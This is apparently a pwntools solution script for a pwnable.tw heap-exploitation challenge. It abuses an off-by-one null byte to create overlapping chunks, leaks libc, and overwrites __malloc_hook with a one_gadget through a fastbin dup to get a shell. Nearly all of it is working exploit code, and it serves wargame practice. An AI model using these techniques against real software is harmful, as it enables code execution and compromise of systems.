from pwn import *

#r = process("./S", env={"LD_PRELOAD" : "./libc_64.so.6"})
r = remote('chall.pwnable.tw',10302)
'''
name_of_heart{
    int64_t size;
    char name[0x30] 
    int64_t addr_of_secret_of_my_heart;
}
'''
## vuln 1 : off by one null at add function 
def add(size,name,secret):
    r.sendafter(b'Your choice :',b'1')
    r.sendafter(b'heart : ',str(size))
    r.sendafter(b'heart :',name)
    r.sendafter(b'my heart :',secret)

def show(idx):
    r.sendafter(b'Your choice :',b'2')
    r.sendafter(b'Index :',str(idx))

def delete(idx):
    r.sendafter(b'Your choice :',b'3')
    r.sendafter(b'Index :',str(idx))

### create overlap chunks by off by null bytes : 
### ref : http://angelboy.logdown.com/ p25 ~ p41
add(0x18,b'123',b'1') #0
add(0x100,b'123',b'1') #1
add(0x100,b'1'*0x18,b'c'*0x18) #2
add(0x18,b'123',b'1')#3 ### prevent merge to top chunks 
delete(1)
delete(0)
add(0x18,b'123',b'c'*0x18)#0 # trigger off by one to overwrite size from 0x110 to 0x100 
add(0x88,b'1',b'c')#1
add(0x68,b'0',b'\x00')#4  ### overlapped chunks
delete(1)
delete(2)

### leak libc using overlap chunk
add(0x38,b'0',b'\x00') # 1
add(0x48,b'0',b'\x00') # 2

show(4)
r.recvuntil(b'Secret : ')
libc_base = u64(r.recv(6)+b'\x00\x00') - 0x3c3b78
success(f'libc : {hex(libc_base)}')

# #### fastbin dup to overwrite malloc_hook
malloc_hook = libc_base + 0x3c3aed
realloc = libc_base + 0x83b1c
one_gadget = libc_base + 0x4526a
add(0x68,b'0',b'aaaaaaa') # 5  same addr to overlap chunks idx:4
add(0x68,b'0',b'aaaaaaa') # 6
delete(5)
delete(6)
delete(4) 
add(0x68,b'0',p64(malloc_hook))
add(0x68,b'0',b'aaaaaaa')
add(0x68,b'0',b'aaaaaaa')
payload = b'\x00'*3 + p64(0) + p64(one_gadget) + p64(realloc)
add(0x68,b'0',payload)
r.sendafter(b'Your choice :',b'1')
r.sendafter(b'heart : ',b'20')
r.sendafter(b'heart :',b'20')
r.interactive()